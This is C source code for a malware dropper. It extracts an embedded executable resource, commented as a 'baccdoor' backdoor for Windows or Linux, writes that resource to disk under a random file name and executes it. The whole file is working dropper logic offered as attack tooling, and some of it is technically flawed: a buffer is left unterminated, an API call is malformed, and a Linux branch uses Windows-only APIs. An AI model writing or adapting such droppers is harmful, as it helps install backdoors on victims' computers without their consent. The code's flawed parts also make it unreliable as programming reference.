// Open this project in Visual Studio or it won't compile (I think :D)
#include <Windows.h>
#include <stdio.h>
#include <time.h>

#define _CRT_SECURE_NO_WARNINGS
#define NAME_SIZE 10
#define ID_BACC_WIN 101         // resource identifier of baccdoor_windows.exe
#define ID_BACC_LINUX 102       // resource identifier of baccdoor_linux.exe

#pragma warning(disable:4996)

// name of dropped PE
char name[10 * NAME_SIZE];

// random name :v
void gen_name() {
    int valid = 0;
    srand(time(NULL));

    while (valid <= NAME_SIZE) {
        char c = rand();

        if (c >= 'a' && c <= 'z')
            name[valid++] = c;
    }

#ifdef _WIN64
    strcat_s(name, ".exe");
#elif __linux__
    strcat_s(name, ".elf");
#endif

}

void drop(int size, void* buffer) {
    FILE* f = fopen(name, "wb");

    // traverse byte list
    for (int i = 0; i < size; i++) {
        // pointer
        unsigned char c1 = ((char*)buffer)[i];

        // drop to file
        fprintf(f, "%c", c1);
    }

    fclose(f);
}

void launch() {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    CreateProcessA(name,
        NULL,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi
    );
}

int main() {
    HMODULE h = GetModuleHandle(NULL);

    // locate Resource
#ifdef _WIN64
    HRSRC r = FindResource(h, MAKEINTRESOURCE(ID_BACC_WIN), MAKEINTRESOURCE(256));
#elif __linux__
    HRSRC r = FindResource(h, MAKEINTRESOURCE(ID_BACC_LINUX), MAKEINTRESOURCE(256));
#endif

    // load Resource
    HGLOBAL rc = LoadResource(h, r);

    // lock resource
    void *data = LockResource(rc);

    // file size
    DWORD size = SizeofResource(h, r);

    gen_name();
    drop(size, data);
    launch();

    return 0;
}